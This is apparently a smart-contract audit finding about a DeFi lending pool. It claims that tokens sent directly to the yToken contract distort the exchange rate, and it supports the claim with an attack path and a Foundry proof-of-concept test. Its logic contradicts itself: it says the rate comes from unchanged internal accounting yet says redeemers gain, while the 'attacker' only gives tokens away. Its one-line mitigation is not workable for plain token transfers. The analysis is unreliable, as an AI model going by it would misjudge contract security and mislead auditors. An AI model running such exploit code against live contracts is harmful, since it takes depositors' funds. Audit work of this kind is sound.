# Inaccurate Internal Accounting and Exchange Rate Manipulation

### Summary

The protocol’s LendingPool deposit logic updates an internal accounting variable (`reserve.underlyingBalance`) when tokens are deposited via the designated function. However, if tokens are sent directly to the yToken contract (i.e. via a plain ERC20 transfer) rather than through the LendingPool’s deposit function, the actual token balance increases without a corresponding update to the internal accounting. This creates a discrepancy between the recorded balance and the actual tokens held, causing the exchange rate used for minting and redemption of yTokens to be distorted. An attacker could exploit this to redeem more underlying tokens than their share should allow, effectively extracting extra value from the pool.

### Root Cause


1. Separate Internal Accounting:
https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/LendingPool.sol#L115
The LendingPool’s` _deposit()` function transfers tokens from the user to the yToken contract using:
```solidity 
IERC20(asset).safeTransferFrom(msg.sender, reserve.yTokenAddress, amount);
```
https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/LendingPool.sol#L129
It then updates the reserve’s internal variable:
```solidity 
reserve.underlyingBalance += amount;
```
This variable is later used to compute the exchange rate for minting and redemption via functions such as 

`reserve.reserveToYTokenExchangeRate() `
and 
`reserve.yTokenToReserveExchangeRate().`


2. Direct Injection Possibility:

There is no restriction preventing any address from transferring tokens directly to the yToken contract using a standard ERC20 `transfer()` call.

Such a direct transfer increases the actual token balance in the yToken contract but does not update `reserve.underlyingBalance.`



3. Discrepancy in Exchange Rate Calculation:

When users redeem yTokens, the protocol calculates the amount of underlying tokens they are entitled to based on the ratio of `reserve.underlyingBalance` (the recorded balance) to the yToken supply.

If the actual balance in the `yToken contract` is higher (due to direct injections), the computed exchange rate will be inflated. This means a redeemer might receive a greater amount of underlying tokens than justified by the deposits processed through the proper flow.



### Internal Pre-conditions

None. 

### External Pre-conditions

None. 

### Attack Path


1. Normal Deposit Flow:

A user deposits 1,000 tokens via the LendingPool’s deposit function.

The LendingPool calls:

`IERC20(asset).safeTransferFrom(user, yToken, 1000);`

The internal accounting is updated:

`reserve.underlyingBalance += 1000;`

The yToken contract balance becomes 1,000 tokens, matching the internal record.



2. Direct Token Injection:

An attacker transfers 500 tokens directly to the yToken contract using a plain `transfer().`

The actual token balance in the yToken contract increases to 1,500 tokens, but the internal variable remains at 1,000.



3. Redemption Impact:

When a user redeems yTokens, the exchange rate is calculated based on `reserve.underlyingBalance (1,000) `over the total yToken supply.

However, the underlying tokens available for redemption are 1,500.

Consequently, the redemption process will yield more underlying tokens per yToken than intended, allowing the attacker (or redeemer) to extract extra value that was not properly backed by recorded deposits.


### Impact

Exchange Rate Distortion:
An inflated actual balance leads to an erroneously high exchange rate. This can allow an attacker or a malicious actor to extract extra underlying tokens when redeeming yTokens.

Dilution of Depositors' Value:
Since the internal accounting does not reflect the extra tokens, the value of yTokens for honest depositors is diluted over time. Those who deposit through the proper channel do not benefit from the injected tokens, while redeemers can receive an outsized portion.

Potential Exploitation:
An attacker could intentionally transfer tokens directly to the yToken contract, then later redeem yTokens for more underlying assets than expected. This extraction of value is particularly dangerous in protocols where the exchange rate is critical to the integrity of deposit/withdraw operations.
 

### PoC

```solidity 
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

// These imports assume you have the protocol contracts available in your project.
import "../src/LendingPool.sol";
import "../src/yToken.sol";
import "../src/ERC20Mock.sol";

contract DirectInjectionTest is Test {
    LendingPool lendingPool;
    ERC20Mock underlying;
    address owner = address(1);
    address user = address(2);
    address attacker = address(3);

    // Set up initial state: deploy underlying token, LendingPool and initialize reserve.
    function setUp() public {
        vm.startPrank(owner);
        // Deploy a standard ERC20 mock token with 18 decimals and a large total supply.
        underlying = new ERC20Mock("Mock Token", "MTK", 18, 1e24);
        // Deploy the LendingPool contract.
        lendingPool = new LendingPool();
        // Initialize the reserve for the underlying token.
        lendingPool.initReserve(address(underlying));
        // Transfer tokens to user and attacker.
        underlying.transfer(user, 1e21);
        underlying.transfer(attacker, 1e21);
        vm.stopPrank();
    }

    function testDirectInjectionImpact() public {
        // ---------- Step 1: Normal Deposit ----------
        vm.startPrank(user);
        uint256 depositAmount1 = 1e20; // User deposits 100 tokens (assuming 18 decimals).
        underlying.approve(address(lendingPool), depositAmount1);
        // Deposit tokens via the LendingPool deposit function.
        uint256 yTokenAmount1 = lendingPool.deposit(address(underlying), depositAmount1, user);
        vm.stopPrank();

        // Get the yToken contract address for the underlying token.
        address yTokenAddress = lendingPool.getYTokenAddress(address(underlying));
        yToken yTokenContract = yToken(yTokenAddress);

        // Record the yToken contract's underlying token balance before injection.
        uint256 balanceBefore = underlying.balanceOf(yTokenAddress);
        console2.log("Balance before injection:", balanceBefore);

        // ---------- Step 2: Direct Injection by Attacker ----------
        vm.startPrank(attacker);
        uint256 injectionAmount = 1e19; // Attacker directly transfers 10 tokens.
        underlying.transfer(yTokenAddress, injectionAmount);
        vm.stopPrank();

        // The yToken contract now holds extra tokens.
        uint256 balanceAfter = underlying.balanceOf(yTokenAddress);
        console2.log("Balance after injection:", balanceAfter);
        assertEq(balanceAfter, balanceBefore + injectionAmount);

        // ---------- Step 3: New Deposit After Injection ----------
        // Now a new deposit occurs. The LendingPool calculates the exchange rate based on its internal
        // accounting (which did not change) while the yToken contract holds an inflated actual balance.
        vm.startPrank(user);
        uint256 depositAmount2 = 1e20; // Another deposit of 100 tokens.
        underlying.approve(address(lendingPool), depositAmount2);
        uint256 yTokenAmount2 = lendingPool.deposit(address(underlying), depositAmount2, user);
        vm.stopPrank();

        // ---------- Step 4: Redemption Comparison ----------
        // Redeem the newly minted yTokens. The redeem process calculates the underlying tokens using
        // the exchange rate based on internal accounting, but the actual backing is higher.
        vm.startPrank(user);
        uint256 redeemedUnderlying = lendingPool.redeem(address(underlying), yTokenAmount2, user);
        vm.stopPrank();

        console2.log("Deposit Amount2:", depositAmount2);
        console2.log("Redeemed underlying after injection:", redeemedUnderlying);

        // Because of the direct injection, the effective exchange rate has increased.
        // Therefore, the redeemed amount should exceed the deposit amount.
        assertGt(redeemedUnderlying, depositAmount2);
    }
}
```

### Mitigation

Prevent Direct Token Transfers
